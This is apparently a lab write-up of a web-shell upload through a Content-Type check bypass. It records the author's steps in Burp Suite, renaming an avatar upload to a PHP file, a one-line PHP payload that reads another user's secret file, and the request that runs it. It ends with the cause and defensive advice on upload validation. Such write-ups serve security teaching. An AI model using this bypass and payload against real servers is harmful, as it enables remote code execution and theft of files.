# Lab: Web Shell Upload via Content-Type Restriction Bypass

## Objective:
Bypass the application's Content-Type validation, upload a PHP web shell, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I uploaded a normal avatar image and intercepted the upload request in Burp Suite.

3. I modified the uploaded filename from:

image.webp

to

myexploit.php

4. I replaced the image contents with the following PHP payload:

<?php echo file_get_contents('/home/carlos/secret'); ?>

5. I intentionally kept the Content-Type header unchanged:

Content-Type: image/webp

6. The server accepted the upload because it only verified the Content-Type header supplied by the client.

7. I accessed the uploaded file:

GET /files/avatars/myexploit.php

8. The server executed the PHP code and returned Carlos's secret:

NZVGAmW44851R9qkdpCtWJi4nC7sok7Z

9. I copied the secret and submitted it.

The lab was successfully solved.

--- 

## Vulnerability:
Web Shell Upload via Content-Type Restriction Bypass

## Cause:
The application relied solely on the client-controlled Content-Type header to determine whether the uploaded file was an image. Because HTTP headers can be modified by the client, an attacker could upload a PHP file while falsely declaring it as an image.

## Takeaway:
The Content-Type header should never be trusted for file validation.

A secure file upload mechanism should validate:

- File extension
- MIME type (server-side)
- Magic bytes (file signature)
- File contents
- Storage location
- Execution permissions

Relying only on the Content-Type header allows attackers to upload executable files and achieve Remote Code Execution.
